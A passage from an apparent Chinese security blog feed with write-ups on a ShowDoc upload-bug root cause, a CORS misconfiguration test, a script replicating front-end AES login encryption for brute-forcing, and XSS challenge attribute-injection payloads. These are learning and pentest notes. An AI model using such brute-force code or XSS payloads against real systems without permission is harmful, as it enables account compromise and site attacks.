，其使用的方法就是<code>$upload-&gt;allowExts</code>错误的写法，而ThinkPHP官方3.2版本的<a href="http://document.thinkphp.cn/manual_3_2.html#upload">说明文档</a>中则使用的是正确的<code>$upload-&gt;exts</code>写法</li><li>那么为什么ThinkPHP官方是对的，而民间大家用的是这种错误的写法？会不会是官方早期版本教学用的就是这个错误的写法？</li></ol><h2 id="5-3-官方自相矛盾吗"><a href="#5-3-官方自相矛盾吗" class="headerlink" title="5.3 官方自相矛盾吗"></a>5.3 官方自相矛盾吗</h2><ol><li>怀疑是ThinkPHP3.2以下版本的官方文档自身用了错误的写法，而民间只是历史沿用这一用法，搜了<a href="http://www.thinkphp.cn/info/194.html">ThinkPHP3.1的说明文档</a>，果不其然用的就是<code>$upload-&gt;allowExts</code> 的错误方式</li><li>那么TP3.2官方为什么在文档中更正TP3.1中的错误的写法？是因为当时爆出了漏洞吗？遗憾的是检索后发现TP3.1并没有爆出这类漏洞</li><li>继续追踪，查看3.1和3.2官方源码发现：是在TP从3.1到3.2版本升级的时候，由于编写文件上传类的负责人换了<code>liu21st</code>→<code>zuojiazi</code>，使得①类名<code>UploadFile()</code> →<code>Upload()</code>②白名单后缀数组名<code>allowExts</code> → <code>ext</code>③文件名，文件路径等发生变更。</li><li>仔细对比3.1和3.2的文档，发现虽然源码发生改变，但对应的教学文档也发生了相应的改变，本质上并不存在漏洞。</li><li>也就说①3.1版本的源码配合3.1的文档，<code>$upload = new UploadFile()</code>搭配<code>$upload-&gt;allowExts</code>不会产生漏洞；②3.2版本的源码配合3.2的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;exts</code>也不会发生漏洞。③但是3.2的版本使用3.1的文档，<code>$upload = new \Think\Upload()</code>搭配<code>$upload-&gt;allowExts</code>就会产生漏洞，而showdoc的漏洞成因很大几率来源于此。</li><li>再次百度、Google相关教程网页，发现民间教程也都和官方文档一样，一一对应（刚刚只关注键名的不同没关注类名的不同，误会民间教程了）。</li><li>也就说官方教程不存在问题，网上教程也不存在问题，如showdoc官方案例这种错赋值的写法并未检索到，那么只能是个人了！</li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2022.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2023.png"></p><h2 id="5-4-大结局：个人问题"><a href="#5-4-大结局：个人问题" class="headerlink" title="5.4 大结局：个人问题"></a>5.4 大结局：个人问题</h2><ol><li>真的是个人问题吗？</li><li>再往前追：2016年8月showdocV1.0.0版本就存在<a href="https://github.com/star7th/showdoc/blob/v1.0.0/Application/Home/Controller/PageController.class.php">这种错误的写法</a>，但是14年TP3.2就出现了</li><li>由于两个作品发布前后间隔两年，首先怀疑作者是基于一个通用模板或CMS改的，但是检索了半天开源框架并没有发现类似案例。</li><li>其次只能怀疑是面向百度编程的通病：①百度内容②发现官网文档③发现demo，但是运行失败③魔改一番，手动将类名由uploadfile改为upload⑤程序运行成功⑥不影响正常业务⑦大功告成！</li><li>我按照这个步骤复现之后发现很类似，最后和作者取得联系，和怀疑的基本差不多。</li></ol><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2024.png"></p><p><img src="https://github.com/corp0ra1/BlogPhoto/tree/master/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%2025.png"></p><h2 id="5-5-时间线"><a href="#5-5-时间线" class="headerlink" title="5.5 时间线"></a>5.5 时间线</h2><p>2013年06月07日：ThinkPHP3.1.3发布，使用<code>UploadFile()-&gt;allowExts</code></p><p>2014年02月03日：ThinkPHP3.2 发布，使用<code>Upload()-&gt;exts</code></p><p>2016年08月07日：showdocV1.0.0发布 ，使用<code>UploadFile()-&gt;exts</code> </p><p>2019年10月12日：RoarCTF开赛，并于14日Ethan师傅Fuzz出了这个点，但其未深究</p><p>2020年08月12日：plzmyy师傅根据Ethan师傅的WP发现showDoc的漏洞</p><h2 id="5-6-总结"><a href="#5-6-总结" class="headerlink" title="5.6 总结"></a>5.6 总结</h2><p>溯源到最后，可以说showdoc是个特例，是由于开发者的一时疏忽导致的。诚然在这个里面个人开发者占很大的问题，但也希望给厂商企业敲响一个警钟，在版本升级时不仅要注意文档和代码的对应性，也需要在更改类的字段名时候慎重考虑。</p><p>对于Ethan师傅也有点可惜，他觉得是个0day，但未深究跟踪一下代码，也许他就真的发现了一个0day。</p><p>对于CTFer来说，也需要多看WP，也许能收获到不同的东西</p><p>对于面向百度编程的我，也需要警惕不要做一个盲目CV的代码首席移动工程师。</p><h1 id="6-大总结"><a href="#6-大总结" class="headerlink" title="6. 大总结"></a>6. 大总结</h1><p>从一个文件上传1day的复现开始，到用Goby简单的GUI编写POC&amp;EXP，再到不满足需求，于是选择用Go语言编写，并且使用Goby自带API不断优化POC，最终实现一键反弹shell。不仅学习了Go，也对EXP进一步的完善。</p><p>代码审计，从一个为什么产生出发，不断地问自己问题，虽然是一次简单的代审，延伸出一次溯源，最后的收获远不止一次代码审计，不可思议的是我的总结居然升华到了人。</p><p>正如Zwell说的“不断问自己问题”的学习方法，随着不停的问自己问题，记录下问题解决它，好奇心吸引着我，最后抵达了一个新的高度，共勉！</p>]]></content>
    
    
    <categories>
      
      <category>漏洞研究</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>POC编写</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CORS漏洞学习及实战应用</title>
    <link href="/2019/07/21/%5Bold%5DCORS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/"/>
    <url>/2019/07/21/%5Bold%5DCORS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%AE%9E%E6%88%98%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>同事搞了个cors的漏洞，什么是cors?我怎么没有听说过？啥玩意啊？我干</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>谈及cors,需要先了解同源策略，跨域请求方案等。<a href="https://blog.csdn.net/qq_36119192/article/details/82931250">传送门</a></p><ol><li>同源策略<ol><li> 是指域名，协议，端口相同</li><li> 目的是为了自己的数据只能自己，其他人无法访问</li></ol></li><li>跨域请求方案<ol><li> 目的为了突破同源策略的限制，使得自己的数据自己的朋友也可以访问</li><li> 两种方案jsonP和cors</li></ol></li><li>jsonP和cors区别 <a href="https://blog.csdn.net/saytime/article/details/51549888">传送门</a><ol><li> SONP只能实现GET请求，而CORS支持所有类型的HTTP请求。</li><li> 使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。</li><li>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS<blockquote><p>CROS是现在主流解决跨域问题的方案，未来估计也是趋势。</p></blockquote><h1 id="什么是cors"><a href="#什么是cors" class="headerlink" title="什么是cors"></a>什么是cors</h1>CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨域的服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。<br>CORS定义了两种跨域请求：简单请求 和 非简单请求。简单跨域请求就是使用设定的请求方式请求数据，而非简单跨域请求则是在使用设定的请求方式请求数据之前，先发送一个OPTIONS预检请求，验证请求源是否为服务端允许源。只有”预检”通过后才会再发送一次请求用于数据传输。<a href="http://javascript.ruanyifeng.com/bom/cors.html">详情点此传送门</a></li></ol></li></ol><h1 id="cors漏洞成因"><a href="#cors漏洞成因" class="headerlink" title="cors漏洞成因"></a>cors漏洞成因</h1><p>就是对cors的配置错误，导致攻击者可以伪装为受害者服务器所允许站点去获取受害者服务器上的资源<br>具体利用，我觉得几篇paper讲的比较清楚的，推荐下</p><ol><li> 18年DefConChina的陈建军的议题《从外部入侵内网，跨域资源共享（CORS）的安全问题》<a href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#1-1-%E4%BB%8E-sop-%E5%88%B0-cors">传送门</a></li><li> 百度挺多的，直接搜就行了,多看几篇文章即可。但是本源还是上面的陈建军师傅的paper</li><li> portswigger的文章<a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">传送门</a>中文翻译文章<a href="https://xz.aliyun.com/t/2702">传送门</a></li><li> 国外大牛的paper<a href="https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/">传送门</a>（其实我觉得很稀烂，可能因为语言原因）</li><li> 发现一片13年的文章，说明漏洞研究挺久的<a href="https://www.freebuf.com/articles/web/18493.html">传送门</a></li></ol><h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>陈建军师傅开发的工具CORScanner<a href="https://github.com/chenjj/CORScanner">传送门</a></p><h1 id="文章概述"><a href="#文章概述" class="headerlink" title="文章概述"></a>文章概述</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827182215.png" alt="20190827182215.png"><br>由上图可以看出特征点Access-Control-Allow-Origin和Access-Control-Allow-Credentials。疑似存在cors漏洞</p><ul><li>  这是个cors漏洞，但因为利用场景极其苛刻，可以说正常情况下基本利用不了。仅供出具渗透测试报告给厂商，作一个风险证明。</li><li>  为什么场景苛刻，只能做个证明？因为浏览器sop的限制，导致跨域访问很难进行。参考陈建军师傅<a href="https://www.jianjunchen.com/post/cors%E5%AE%89%E5%85%A8%E9%83%A8%E7%BD%B2%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/#2-6-origin-%E4%B8%8E-credentials-true-%E5%85%B1%E7%94%A8">《文章的2.6章节》</a>和CSDN文章<a href="https://blog.csdn.net/haoren_xhf/article/details/80050311">《Access-control-allow-origin:*并没有实际危害（更新）》</a></li><li>我怎么做的？<ul><li>  观察到客户端有请求到对应站点，同时服务器有返回包返回给客户端，只不过本地浏览器的限制导致无法利用。既然浏览器的问题，则可以通过换个浏览器，或者换个版本尝试。</li><li>  chrome尝试执行命令disable掉安全选项，但是无果。firefox也报错,ie9对异步请求支持不行。</li><li>  最后我采取ie同时disable掉一些安全选项。ie版本:11.295.18362.0</li></ul></li></ul><p><strong>因为正常来说是不会disable掉这些选项的，所以难利用</strong><br>当然我也只是尝试了一部分方法然后得出上面的结论，可能有点草率，主要是网上没搜到相关文章。抛砖引玉吧！<br>如果还有其他方法，欢迎大佬们一起交流如何绕过这个限制，</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol><li>发现被限制了<br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/%E8%A2%AB%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E9%99%90%E5%88%B6.png" alt="被同源策略限制.png"><br> 原因很简单：原文cors策略的限制，导致如果Access-Control-Allow-Origin为*，则Access-Control-Allow-Credentials不可以为true</li><li>在Stack Overflow上找到解决方法，即采取disable掉一些安全选项。<a href="https://stackoverflow.com/questions/20947359/how-to-disable-same-origin-policy-internet-explorer/20947828#20947828">传送门</a><br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827172718.png" alt="20190827172718.png"><br> 我的disable过程截图，见文末，就不占正文空间了。</li><li>构建cors站点的poc很多，推荐两个GitHub上的<a href="https://github.com/chenjj/CORScanner">陈建军师傅的版本</a>以及<a href="https://github.com/topavankumarj/CORS-Exploit-Script/blob/master/cors.html">我使用的版本</a><br> 由于前端代码功力太弱，建军师傅的poc我只能打印console log，然后报错，尝试半天，就换了其他的。emmm前端很菜勿喷</li><li>最后的利用截图（别问，政企客户打码得死死的！)<br> <img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/cors%E6%89%93%E7%A0%81.gif" alt="cors打码.gif"></li></ol><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="白帽汇的一篇cors文章"><a href="#白帽汇的一篇cors文章" class="headerlink" title="白帽汇的一篇cors文章"></a>白帽汇的一篇cors文章</h2><p>白帽汇的<a href="https://nosec.org/home/detail/2440.html">翻译文章</a> 以及英文的<a href="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors">原文</a> </p><p>白帽汇的这篇cors的翻译文章的第一攻击场景，说<strong>Access-Control-Allow-Origin=*</strong> 和 <strong>Access-Control-Allow-Credentials=true</strong>同时出现就可以利用，其实是错误的。主要是没有注意英文原文下面的评论部分</p><p>这个更加警醒我自己，纸上得来终觉浅，还是要自己亲自尝试才是！</p><h2 id="其他失败的尝试过程"><a href="#其他失败的尝试过程" class="headerlink" title="其他失败的尝试过程"></a>其他失败的尝试过程</h2><p>chrome的尝试跨域的解决方法</p><ul><li>  插件法：<a href="https://blog.csdn.net/a1333888/article/details/52575325">https://blog.csdn.net/a1333888/article/details/52575325</a></li><li>  命令法：<a href="https://blog.csdn.net/qq_39704803/article/details/82760363">https://blog.csdn.net/qq_39704803/article/details/82760363</a></li><li>  命令法②：<a href="https://blog.csdn.net/Umbrella_Um/article/details/98222981">https://blog.csdn.net/Umbrella_Um/article/details/98222981</a><br>我个人尝试过chrome多个命令，但是最后还是无果</li></ul><p><a href="https://www.webdavsystem.com/ajax/programming/cross_origin_requests/">传送门</a>，查看该文章发现chrome和firefox如果想利用，则需要服务器端设置相关参数，而ie9貌似可以通过disable一些选项操作，但是我这个涉及到ajax异步的过程，ie9支持不够好，无法好好利用就没有深究。</p><h2 id="我的disable过程截图"><a href="#我的disable过程截图" class="headerlink" title="我的disable过程截图"></a>我的disable过程截图</h2><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173022.png" alt="20190827173022.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173101.png" alt="20190827173101.png"><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173133.png" alt="20190827173133.png"></p><h2 id="利用过程中ie11出现的小问题"><a href="#利用过程中ie11出现的小问题" class="headerlink" title="利用过程中ie11出现的小问题"></a>利用过程中ie11出现的小问题</h2><p>本来可以正常使用，但是中途用着用着，点击按钮就没反应<br>F12查看控制台报错“SCRIPT5007: 属性“$”的值为 null、未定义或不是 Function 对象”<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173220.png" alt="20190827173220.png"><br>解决方法：<strong>重置ie浏览器设置即可，重置过程</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190827173308.png" alt="20190827173308.png"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>CORS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>first vuln from practice to practice</title>
    <link href="/2019/07/18/%5Bold%5D%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B4%9E/"/>
    <url>/2019/07/18/%5Bold%5D%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>这算是我的第一次渗透测试了，之前是DVWA，不算真实环境的那种！这次因为公司分配原因，我分配漏了（哈哈哈哈），然后就和学长一起做<br>由于学长太强，我就可以自由安排时间想干啥就干啥，我主要想测试登录界面账号密码的爆破，就干了。就全程淌水吧！太快乐了！</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><ol><li><p> 测试爆破，先burp抓个包！</p></li><li><p>发现拦截到的账号密码中的密码部分采取了加密，查看了下源代码<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190713103853.png" alt="20190713103853.png"></p><blockquote><p>本质上，代码很简单，就是很常见的demo而已！见此文:<a href="https://www.jianshu.com/p/a47477e8126a">代码一</a><a href="https://www.cnblogs.com/lz2017/p/8046816.html">代码二</a></p></blockquote></li><li><p> 代码流程:前端调用了crypto-js库进行加密，而且key都是源代码里面，那么就存在理论上爆破的可能性</p></li></ol><p>一个相似的案例：<a href="https://www.jianshu.com/p/94c407cf75a4">文章</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>就是因为密码被前端加密了，所以burp直接爆破存在一定难度<br>因此想法就是python爆破,当务之急是模拟这个加密的过程</p><ol><li> 直接调用python有的crypto库及其AES加密格式</li><li>python里面调用js代码<ol><li> PyExecJS、js2py，pyv8</li><li> selenium框架</li></ol></li></ol><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ol><li>直接调用python有的crypto库及其AES加密格式<ul><li>  好像API不同，什么iv偏移量之类的都发现，感觉不合适，放弃了 </li></ul></li><li>js2py<ul><li>先说说PyV8、PyExecJS、js2py的区别吧！<br>  js2py是装换代码本身，改为python可执行的，PyV8、PyExecJS是模拟js执行，本质完全不同.而PyExecjs是通过将要运行的js代码写到/tmp下面的随机文件里，然后调用相关的解释器执行该文件，效率相较于pyv8也是慢了点</li><li>  所以考虑到js2py是js转换为python，效率上肯定不如上面的，就放弃了</li></ul></li><li>pyv8<ul><li>   找到了一个案例：<a href="https://www.jianshu.com/p/055e1ddf7bb2%EF%BC%8C%E8%80%8C%E4%B8%94%E4%BB%A3%E7%A0%81%E4%B9%9F%E5%B8%AE%E6%88%91%E5%86%99%E5%A5%BD%E4%BA%86">https://www.jianshu.com/p/055e1ddf7bb2，而且代码也帮我写好了</a></li><li>   太难安装了，而且是2010年的库很久没维护了，就放弃了</li></ul></li><li>selenuim框架<ul><li>   讲道理很好用的框架。原理是：调用浏览器然后模拟用户输入进行尝试。</li><li>   我搞了差不多一天,学长1个小时利用这个selenuim框架就搞定了，我后面自己简单尝试了下，反正上手挺快的</li><li>   缺点很明显就是慢，因为要调用浏览器，然后通过浏览器去执行<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1>我一开始尝试的就是pyexecjs，只是中途报了半天错，各种调试心态崩就转而尝试过上面的内容，但是最终还是pyexecjs帮我做出来了，当然效率肯定是比selenuim框架高的<br>直接贴代码，源头出自<a href="https://blog.csdn.net/qq523176585/article/details/94010652">这篇文章</a><br>特别感谢那个博主居然能在一个小时之内回复我！！！我都差点放弃了。。。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> execjs<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">js_aes</span>(<span class="hljs-params">text</span>):</span><br>    jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    function encode(password)&#123;</span><br><span class="hljs-string">        var CryptoJS = require(&quot;crypto-js&quot;);#这个是个核心</span><br><span class="hljs-string">        var key = CryptoJS.PBKDF2(</span><br><span class="hljs-string">            &#x27;xxxxx&#x27;,#你的key</span><br><span class="hljs-string">            CryptoJS.enc.Hex.parse(&#x27;xxxxxxx&#x27;),#你的key</span><br><span class="hljs-string">            &#123;keySize: 4, iterations: 1000&#125;);</span><br><span class="hljs-string">        var encrypted = CryptoJS.AES.encrypt(</span><br><span class="hljs-string"></span><br><span class="hljs-string">            </span><br><span class="hljs-string">            password,</span><br><span class="hljs-string">            key,</span><br><span class="hljs-string">            &#123;iv: CryptoJS.enc.Hex.parse(&#x27;xxxxxx&#x27;)&#125;);#你的key</span><br><span class="hljs-string">        return encrypted.ciphertext.toString(CryptoJS.enc.Base64);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    ctx = execjs.<span class="hljs-built_in">compile</span>(jscode)<br>    encrypto = ctx.call(<span class="hljs-string">&quot;encode&quot;</span>,text)<br> <br>    <span class="hljs-keyword">return</span> encrypto<br>    <br>text = <span class="hljs-string">&quot;123456&quot;</span><br>js_res = js_aes(text)<br><br><span class="hljs-built_in">print</span> (js_res)<br></code></pre></td></tr></table></figure><blockquote><ul><li> 我之前做出了加密过程，具体爆破脚本就没写了，就只是python的request库即可</li><li> 由于我此次只需要js加密过程，不需要AES加密就删除了大多部分</li><li> 中间的js_ase函数中间的encode部分，根据此处的环境，我做了更改</li><li> 博主那篇文章对我而言最核心的部分在于<code>var CryptoJS = require(&quot;crypto-js&quot;);</code>帮我解决了困扰了一天的问题，即如何在js函数里面又去执行js库文件，我之前各种尝试出错，出错过程见下文</li></ul></blockquote></li></ul></li></ol><p>然后跑出来的加密结果和burp拦截到前端加密的结果一样 都是zw8vndc9TsKa7HK+8jHd6g==，于是故事就差不多了，就剩下吧这个js_res和request结合在一起写爆破脚本了</p><h1 id="防护之道"><a href="#防护之道" class="headerlink" title="防护之道"></a>防护之道</h1><ol><li> 验证码！但是之前尝试过验证码识别的爆破。。。感觉实际防护效果一般，只要攻击方投入足够的精力即可爆破</li><li> 采取其他加密方式，而且不是采取对称的AES加密，更何况key都在本地了！</li><li> 限制登录次数！这个才是完美无敌解！<h1 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h1><h2 id="crypto和前端Js代码如何一起整合进python库"><a href="#crypto和前端Js代码如何一起整合进python库" class="headerlink" title="crypto和前端Js代码如何一起整合进python库"></a>crypto和前端Js代码如何一起整合进python库</h2>因为这个前端的js代码调用crypto的js库进行加密，涉及到两个含js文件<br>按照pyexecjs的<a href="https://pypi.org/project/PyExecJS/">官方网站</a>，或者百度上pyexecjs的demo都只涉及到一个js文件整合到python文件里面，这里是两个。<blockquote><p>我尝试过把前端加密函数的js函数放在crypto库密码合并为一个文件，无论把js文件放在开头还是结尾，还是中间各种报错。<br>我也尝试过<code>execjs.compile(jscode+jsstr) </code>这种格式同时编译两个文件在一起，但是还是不行</p><blockquote><p>后来发现crypto库里面是俩个(function(){…})()函数,这种格式是个立即执行函数，可能存在这方面因素<br>前端Js加密需要的是个crypto的对象，而(function){}()就是返回这个对象，直接插进去肯定有问题啊。怎么返回这个对象？你这个插入的前端加密的js函数怎么去调用它？怎么返回这个加密后的值？</p></blockquote></blockquote><h2 id="js里面尝试包含js文件"><a href="#js里面尝试包含js文件" class="headerlink" title="js里面尝试包含js文件"></a>js里面尝试包含js文件</h2>尝试文件包含，但是百度搜的是js文件包含，js文件里面包含另外一个文件之类的关键词，得到的<br><code>document.write(&quot;&lt;script language=javascript src=&#39;xxx.js&#39;&gt;&lt;/script&gt;&quot;);</code>还有各种姿势，反正都有问题<blockquote><p><del>看了上面的代码，发现一个require，然后返回对象就能解决</del><br>我所尝试文件包含的想法是：从html里面js文件copy到本地创建的crypto.js文件，然后包含，类似于html里面的加密实现，但是怎么在python里面执行js代码，然后这个js代码再去调用js库文件？这一套执行流程百度不到，算是开天辟地，所以我就。。。反正瞎尝试，也就浪费了一上午<br>而poc里面是npm下载的整个crypto库进行的require然后返回对象。</p></blockquote><h2 id="pyv8安装"><a href="#pyv8安装" class="headerlink" title="pyv8安装"></a>pyv8安装</h2>当时下载的pyv8文件夹里面看到pyd和macosx文件，没有找到.so的文件，感觉不对就放弃了<br>但是发现只是自己没多找几篇pyv8的文章：下载的文件里面没有.so文件但是要自己改名来着。。。。<h2 id="poc执行报错说：Cannot-find-module-‘crypto-js’"><a href="#poc执行报错说：Cannot-find-module-‘crypto-js’" class="headerlink" title="poc执行报错说：Cannot find module ‘crypto-js’"></a>poc执行报错说：Cannot find module ‘crypto-js’</h2>npm安装这个crypto库,需要在poc脚本的同目录下执行nmp install crypto这个命令才可以，然后生成node_modules下面的crypto-js文件夹即可（安装这个库的命令记不清了，可能有误，推荐百度）</li></ol><h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><ol><li> 感觉自己好像就是拿了爬虫的方法搞了信息安全，信息安全好像啥都学?但是好像啥都可以在渗透过程中使用?</li><li> 要多学几种方法,因为可能这个pyexecjs会报错，pyv8就不会。这里爆破数目不大，且操作复杂，使用selenuim框架即可。多掌握方法，实际灵活改变即可</li><li> 忙了一天，这么简单的问题。。。但是学长也说这些坑他都踩过，还行吧，多踩下没坏处！</li><li> 不要放弃！坚持就是胜利，我差点就放弃了pyexecjs这条方法了都，但是皇天不负有心人！</li></ol><h1 id="其他文章推荐"><a href="#其他文章推荐" class="headerlink" title="其他文章推荐"></a>其他文章推荐</h1><p>今天发现了很多相似的文章，他们写的更好，推荐下</p><p>Bypass师傅的：<a href="https://blog.csdn.net/qq_23936389/article/details/81256012">https://blog.csdn.net/qq_23936389/article/details/81256012</a></p><p>多种姿势：<a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></p><p>工具：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>值得纪念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS挑战之旅</title>
    <link href="/2019/07/09/%5Bold%5DXSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <url>/2019/07/09/%5Bold%5DXSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/1206">https://xz.aliyun.com/t/1206</a></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h1><p><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190709102507.png" alt="20190709102507.png"></p><blockquote><p>‘ oninput=alert<code>1</code> //<br>‘ oninput=alert<code>1</code> ‘<br>‘ onchange=alert<code>1</code> //<br>‘ onchange=alert<code>1</code> ‘</p></blockquote><h2 id="问题1——value-’”-htmlspecialchars-str-”‘"><a href="#问题1——value-’”-htmlspecialchars-str-”‘" class="headerlink" title="问题1——value=’”.htmlspecialchars($str).”‘"></a>问题1——value=’”.htmlspecialchars($str).”‘</h2><p> <code>&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</code>是什么语法？怎么还有”.”的语法？</p><blockquote><p>不能孤立的看待！他不是一个单独的html标签，他只是被拼接的字符串的其中一个子语句。<br>查看下图，你会发现他本质就是把①②③④四个字符串拼接成一整个字符串，然后再echo出来！这里的“是为了和前面的闭合，然后通过点连接符连接起来<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190618121324.png" alt="20190618121324.png"></p></blockquote><h2 id="问题2——htmlspecialchars"><a href="#问题2——htmlspecialchars" class="headerlink" title="问题2——htmlspecialchars"></a>问题2——htmlspecialchars</h2><p>明明用htmlspecialchars过滤之后的str，为啥还可以用’闭合前面的标签的’？难道单引号没有被实体化？</p><blockquote><ul><li>htmlspecialchars函数语法：<code>$str = htmlspecialchars(string,flags,character-set,double_encode);</code>第二个参数flags参数为可选参数，但是规定<strong>如何处理引号</strong>、无效的编码以及使用哪种文档类型，而默认处理引号的方式是<code>ENT_COMPAT：默认。仅编码双引号。</code>，也就单引号并不会被实体化，只是处理双引号。<br>例子参考<a href="https://baijiahao.baidu.com/s?id=1621553793329253809&wfr=spider&for=pc">传送门</a></li><li>  反映到这里参考level3的编码，可以看到&lt;&gt;和”都被实体化编码了，但是单引号没有<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190618122415.png" alt="20190618122415.png"></li></ul></blockquote><h2 id="问题3——双引号闭合"><a href="#问题3——双引号闭合" class="headerlink" title="问题3——双引号闭合"></a>问题3——双引号闭合</h2><p>上面是因为第二个flags参数没有设置，导致的单引号可以与前面的单引号闭合。现在我假设前面是双引号让你闭合呢？或者在htmlspecialchar这里设置了flags参数过滤同时过滤单双引号呢？</p><blockquote><p>暂时没有想到解法，比如level4也是双引号闭合，但是level4此时采取的是自定义函数过滤&lt;&gt;，而没有使用htmlspecialchars函数过滤</p></blockquote><h2 id="如何判断是单引号还是双引号闭合？"><a href="#如何判断是单引号还是双引号闭合？" class="headerlink" 